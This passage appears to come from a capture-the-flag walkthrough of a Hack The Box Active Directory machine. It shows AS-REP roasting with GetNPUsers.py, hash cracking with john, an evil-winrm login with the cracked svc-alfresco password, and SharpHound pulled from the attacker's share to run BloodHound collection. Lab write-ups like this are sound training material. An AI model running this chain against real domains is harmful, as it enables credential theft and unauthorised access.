```
GetNPUsers.py -format john -no-pass -k -usersfile users -dc-ip 10.10.10.161 HTB.LOCAL/ 
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

###For this article, we will use BloodHound to map the whole environment. For that, we first will upload SharpHound to the victim machine.
```
<<Invoke-BloodHound -CollectionMethod All>>
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\PowerSploit\Recon\network>  copy //10.10.16.228/kali/enumeration/nmapAutomator/10.10.10.161/SharpHound.ps1 .
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\PowerSploit\Recon\network> . .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\PowerSploit\Recon\network> Invoke-BloodHound -CollectionMethod All*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\PowerSploit\Recon\network> 

```

